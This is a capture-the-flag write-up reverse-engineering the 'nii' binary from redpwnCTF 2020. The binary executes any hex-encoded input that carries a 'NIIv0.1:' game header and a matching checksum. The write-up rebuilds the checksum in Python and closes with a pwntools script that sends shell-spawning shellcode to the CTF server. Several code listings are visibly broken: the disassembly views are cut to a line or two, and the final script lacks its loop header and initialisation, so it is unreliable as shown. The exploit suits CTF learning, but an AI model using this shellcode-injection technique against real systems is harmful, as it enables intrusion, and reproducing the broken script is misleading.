## Basic Research

Beginning basic analysis on the program, running file shows that it's a `64 bit executable ELF`.

>nii: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=8def7e412da3017e4dd7fcf2c2d6ad0ac37ba8e4, stripped

The binary is statically linked and stripped, which would make sense because the binary is firmware. And running it, it prints some Chinese and takes user input but closes right after.

Translating the Chinese to English shows that it is:

```
In 2020, Wentian Software Company-All rights reserved.
Please insert the game disk...
```

So a first guess is that the binary is reading some sort of code for a "game disk" through stdin.

## Static Analysis

With the assumptions from basic research on the binary, we step into a disassembler which my choice was `IDA`.

![](/content/OEP/nii/start.PNG)

The binary is small and uses syscalls, but something is stopping IDA from defining a function for `start`. Trying to define a function at the beginning of `start` by pressing `P` while selecting the first instruction puts the failure output in the console.

```
.text:0000000000401205: The function has undefined instruction/data at the specified address.
```

Quickly scanning `start` for the undefined instructions, the binary calls `sys_write`, `sys_mmap`, and `sys_read`. It then has small function calls and compares to large integers moved into `rax`. Then a looping block of code, a call to `sys_mprotect`, and a call to `sys_exit`. The call to `sys_exit` doesn't seem to have a conditional to go around it so the data after is most likely what is causing the errors. Undefining the data from instructions makes it pretty obvious that it is a string for 
```
int main() {
    puts(flag);
}
```

![](/content/OEP/nii/dataend.PNG)

To fix this, go to the end of the function which in this case is the syscall to `sys_exit` at `0x11F1` in the binary. Press `Alt+L`, go back up to the beginning of `start`, click the beginning of start at `0x1025` and press `P` to define a function. This defines an anchor point in IDA which allows it to understand that you're manually defining the end of a function rather than IDA assuming it incorrectly, which happens when embedded data is in code.  

Now that graph view is accessible, the code flow is a lot more obvious. We'll look at the binary block by block in graph view.  

![](/content/OEP/nii/node1.PNG)

The first code block has a call to `sys_write` which writes out the Chinese text to stdout. The binary then maps a `0x1000` sized memory region with `sys_mmap`. After mapping the region it reads from `stdin` into a buffer at `0x402064` with the size `0x200`. The resulting value from `sys_read` which is the amount of bytes read gets divided by 2 and moved into `0x402062`.  

![](/content/OEP/nii/node2.PNG)

The second code block is a loop with the iterator in the `rcx` register. It moves the byte at `[rsi+rcx*2]` into `al`, which is the lower 8 bits of `rax`. It then calls the function `sub_401010` which is seen below in text.

```
.text:0000000000401010 sub_401010      proc near               ; CODE XREF: start+8B↓p
.text:0000000000401010                                         ; start+98↓p
.text:0000000000401010                 cmp     al, 30h
.text:0000000000401012                 jl      short sub_401000
.text:0000000000401014                 cmp     al, 39h
.text:0000000000401016                 jle     short loc_401022
.text:0000000000401018                 cmp     al, 41h
.text:000000000040101A                 jl      short sub_401000
.text:000000000040101C                 cmp     al, 46h
.text:000000000040101E                 jg      short sub_401000
.text:0000000000401020                 sub     al, 7
.text:0000000000401022
.text:0000000000401022 loc_401022:                             ; CODE XREF: sub_401010+6↑j
.text:0000000000401022                 sub     al, 30h
.text:0000000000401024                 retn
.text:0000000000401024 sub_401010      endp
```

This function compares `al` from the code calling it, which in the case of the first run of the function, will be the first character we sent. Just as an example, we will use `A` or `0x41`. Going through the function while assuming `al` is `0x41`, we get through all the checks. The calls to `sub_401000` are basically just exiting the program as `sub_401000` is just a syscall to `sys_exit`, so I renamed it to `exit`. The function's code flow with `0x41` subtracts 7 from it, which would be `0x3A`, and subtracted by `0x30` would be `0xA`. So the function at `sub_401010` translates a single hex ASCII character into it's hex value.  

Looking after the call to `sub_401010` in the second code block, it shifts `ax` by `0xC` which would make `0xA` in `al` be `0xA000` in `ax`. The code block then retrieves the second character and translates it to it's hex value. The hex value stored in `al` is then added with `ah` to create a single hex value from the hex ASCII. A hex value in ASCII of `7A` would transfer to an `ax` value of `700A` with `ah` being `70` and `ax` being `0A`. When these are added it will make a single value of `7A`. The value of `7A` is then moved into the buffer it was retrieved from and the loop continues until all bytes are translated. From this information we know that the binary expects the ASCII representation of hex for bytes sent to the binary.

![](/content/OEP/nii/node3.PNG)

The third code block is multiple blocks doing repeated checks that IDA separates due to their conditional jumps. The values moved into `rax` are quite obviously ASCII as they are all within the range of readable characters. Change them into strings by clicking on them and pressing `R`. After doing this, the text representation of the graph is below.

```
.text:00000000004010CF                 mov     rax, ':1.0vIIN'

.text:0000000000401127
.text:0000000000401127 loc_401127:                             ; CODE XREF: start+CB↑j
.text:0000000000401127                                         ; start+DB↑j ...
.text:0000000000401127                 xor     rbx, rbx
```

The first check compares the very first bytes to a string `NIIv0.1:` and if it is not the correct string, jumps to exit. The other checks check for a string after the `:` in the previous check, for different strings that are quite obviously 8 byte version of game names such as `MaroCart`. From this information we can assume the binary is expecting a header of `NIIv0.1:MaroCart` where MaroCart is any name whitelisted in the above check.

![](/content/OEP/nii/node4.PNG)

It zeroes `rbx` and `rdx`, and moved a 4 byte integer into `edx` after the header found in the previous code block. It then changes `rsi` to point to the beginning of the data after the integer moved into `edx`. It zeroes a value at `[rsi+rbx+0x14]` where `rbx` is the size of the buffer at `rsi` divided by 2. The rest of the code looks like a nested for loop because of 2 conditional loops using different iterators. The parent loop iterates over each byte by increasing `rsi` and using `r8` for a size iterator by comparing to the stored size.  The loop inside runs 8 times due to the greater than or equal to condition of the jge jump while comparing `cl` to 0, starting `cl` at 7 and decreasing `cl` each run.  
The loop itself does a lot of shifting, anding, and xoring over each byte. The end of the code block also checks the result against the one we sent so this is some sort of check for integrity, like [CRC](https://en.wikipedia.org/wiki/Cyclic_redundancy_check).

![](/content/OEP/nii/node5.PNG)

The last code block ran copies data from the data that was checked in the previous section, into the mapped region from the beginning using the `size_of_buf` subtracted by 0x14 for the size `rep movsb` does. The definition for `rep movsb` is `Move (E)CX bytes from DS:[(E)SI] to ES:[(E)DI]` so this makes sense in the context. The binary then calls `sys_mprotect` to make the data executable and calls it from `rax`. Exit is called after everything finished so we went through all of the code flow. 

## Implementing the CRC algorithim 

Using the information found from reverse engineering the binary we know that the binary will run any shellcode sent as long as it has the headers required and a passing CRC. For this I will be using pwntools in Python as it is very useful for interacting with a binary directly with data and it has a module called `shellcraft` that we can call like `shellcode = asm(shellcraft.sh())` to generate shellcode to create a shell.  

The text view of the CRC generation:

.text:000000000040118D                 jnz     exit
```

To implement the CRC algorithim we will need a nested loop in Python that will iterate over the shellcode we generated and return the correct CRC the binary will generate.

```python
edi = 0
for char in shellcode:
    itera = 7 #mov cl, 7
    while itera >= 0: #cmp cl, 0
        itera = itera - 1 #dec cl
```

The very first thing it does inside of the loop is zero `r9`, and shift `edi` left once. The shift is grouped with a `cmovb` for `r9` which is a conditional move if the `carry flag(CF)` is set to 1. This check is basically equal to the code below, because if the `most significant bit` is set in `edi` then `r9` is set to `0x80000011`.

```python
edi = 0
for char in shellcode:
    itera = 7 #mov cl, 7
    while itera >= 0: #cmp cl, 0
        r9 = 0 #xor r9, r9
        edi2 = edi << 1 #shl edi, 1
        if(edi & 0x80000000): #cmovb r9, rax
            r9 = 0x80000011 #cmovb r9, rax
        itera = itera - 1 #dec cl
```

The binary then sets `r10b` to the current character in the loop, and does `shr` based on the iterator for the nested loop. It then does `and` against `r10b` with 1. The representation is shown below.

```python
edi = 0
for char in shellcode:
    itera = 7 #mov cl, 7
    while itera >= 0: #cmp cl, 0
        r9 = 0 #xor r9, r9
        edi2 = edi << 1 #shl edi, 1
        if(edi & 0x80000000): #cmovb r9, rax
            r9 = 0x80000011 #cmovb r9, rax
        r10b_shr = char >> itera #shr r10b, cl
        r10b_and = r10b_shr & 1 #and r10b, 1
        itera = itera - 1 #dec cl
```

The binary then does `xor` against the lower 8 bits of `rdi` with `r10b`. As we need to limit this to a single byte we will have to add an `& 0xFF` so it correctly does it. And we will also have to make sure it gets put into the full value for `edi` as the lower 8 bits for a register are a part of the full register but Python doesn't know that. We can do this by taking the original `edi2` variable and doing `& 0xFFFFFF00` so that the lowest byte is empty. Then ORing it against that value will create the correct value needed.

```python
edi = 0
for char in shellcode:
    itera = 7 #mov cl, 7
    while itera >= 0: #cmp cl, 0
        r9 = 0 #xor r9, r9
        edi2 = edi << 1 #shl edi, 1
        if(edi & 0x80000000): #cmovb r9, rax
            r9 = 0x80000011 #cmovb r9, rax
        r10b_shr = char >> itera #shr r10b, cl
        r10b_and = r10b_shr & 1 #and r10b, 1
        edi_xor = (r10b_and ^ edi2) & 0xFF #xor dil, r10b
        edi2 = (edi2 & 0xFFFFFF00) | edi_xor #xor dil, r10b
        itera = itera - 1 #dec cl
```

And the last thing we are missing is the `xor` against `r9`, which can be easily made as shown below. This will keep `edi` equal to the CRC while `edi2` destroys itself to generate the next cycle.

```python
edi = 0
for char in shellcode:
    itera = 7 #mov cl, 7
    while itera >= 0: #cmp cl, 0
        r9 = 0 #xor r9, r9
        edi2 = edi << 1 #shl edi, 1
        if(edi & 0x80000000): #cmovb r9, rax
            r9 = 0x80000011 #cmovb r9, rax
        r10b_shr = char >> itera #shr r10b, cl
        r10b_and = r10b_shr & 1 #and r10b, 1
        edi_xor = (r10b_and ^ edi2) & 0xFF #xor dil, r10b
        edi2 = (edi2 & 0xFFFFFF00) | edi_xor #xor dil, r10b
        edi = edi2 ^ r9 #xor rdi, r9
        itera = itera - 1 #dec cl
```

The full script is shown below and us getting the flag with it :)

```python
from pwn import *

context.arch = "x86_64"
#context.log_level = 'debug'
shellcode = asm(shellcraft.sh())

    while itera >= 0: #cmp cl, 0
        r9 = 0 #xor r9, r9
        edi2 = edi << 1 #shl edi, 1
        if(edi & 0x80000000): #cmovb r9, rax
            r9 = 0x80000011 #cmovb r9, rax
        r10b_shr = char >> itera #shr r10b, cl
        r10b_and = r10b_shr & 1 #and r10b, 1
        edi_xor = (r10b_and ^ edi2) & 0xFF #xor dil, r10b
        edi2 = (edi2 & 0xFFFFFF00) | edi_xor #xor dil, r10b
        edi = edi2 ^ r9 #xor rdi, r9
        itera = itera - 1 #dec cl


#p = process("./nii")
p = remote("2020.redpwnc.tf", 31215)
p.sendline(binascii.hexlify((b"NIIv0.1:MaroCart"+p32(edi)+bytes(shellcode))).upper())
p.interactive()
```
